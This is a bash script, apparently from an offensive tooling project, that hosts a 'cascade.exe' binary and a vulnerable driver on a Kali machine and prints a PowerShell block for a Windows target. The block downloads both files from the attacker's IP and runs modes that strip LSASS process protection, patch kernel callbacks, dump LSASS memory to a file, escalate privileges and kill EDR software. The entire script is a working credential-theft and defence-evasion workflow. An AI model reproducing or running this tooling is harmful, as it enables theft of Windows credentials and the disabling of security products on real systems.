#!/usr/bin/env bash
# deploy_and_test.sh
# Upload cascade.exe to Windows target via Python HTTP server on Kali,
# then run all test modes via WinRM or SSH.
#
# Usage: bash tools/deploy_and_test.sh <WIN_TARGET_IP> [DRIVER_PATH]
#
# Prerequisites: cascade.exe already built at build/Release/cascade.exe

set -e

TARGET="${1:?Target IP required}"
DRIVER="${2:-BiosToolCommonDriver.sys}"
REPO="$(cd "$(dirname "$0")/.." && pwd)"
EXE="$REPO/build/Release/cascade.exe"
PORT=8765

[ -f "$EXE" ] || { echo "[-] Build cascade.exe first: see CMakeLists.txt"; exit 1; }
[ -f "$DRIVER" ] || { echo "[-] Driver not found: $DRIVER"; exit 1; }

echo "[*] Serving $EXE and $DRIVER on :$PORT..."
cp "$EXE" /tmp/cascade.exe
cp "$DRIVER" /tmp/$(basename $DRIVER)
cd /tmp
python3 -m http.server $PORT &
SRV=$!
trap "kill $SRV 2>/dev/null" EXIT

MY_IP=$(ip route get $TARGET 2>/dev/null | awk '/src/{print $7;exit}')
echo "[*] Attacker IP: $MY_IP"
echo ""
echo "[*] Run on Windows (PowerShell as admin):"
echo ""
cat <<PS

# --- paste this block in PowerShell ---
\$url = "http://$MY_IP:$PORT"
Invoke-WebRequest "\$url/cascade.exe"     -OutFile C:\\Windows\\Temp\\cascade.exe
Invoke-WebRequest "\$url/$(basename $DRIVER)" -OutFile C:\\Windows\\Temp\\$(basename $DRIVER)

\$d = "C:\\Windows\\Temp\\$(basename $DRIVER)"
\$c = "C:\\Windows\\Temp\\cascade.exe"

Write-Host "--- test-rw ---"
& \$c --driver \$d --test-rw

Write-Host "--- dry-run (LSASS PPL) ---"
& \$c --driver \$d --dry-run

Write-Host "--- list-callbacks ---"
& \$c --driver \$d --list-callbacks

Write-Host "--- ppl-strip lsass ---"
\$lpid = (Get-Process lsass).Id
& \$c --driver \$d --ppl-strip --pid \$lpid

Write-Host "--- dump-rpm ---"
& \$c --driver \$d --patch-callbacks --dump-rpm --out C:\\Windows\\Temp\\lsass.bin

Write-Host "--- priv-esc self ---"
& \$c --driver \$d --priv-esc

Write-Host "--- kill-edr (EDR not present, expect 0 kills) ---"
& \$c --driver \$d --kill-edr

Write-Host "Done. Check C:\\Windows\\Temp\\lsass.bin"
# --- end block ---

PS

echo "[*] Server running. Press Ctrl+C when done."
wait $SRV
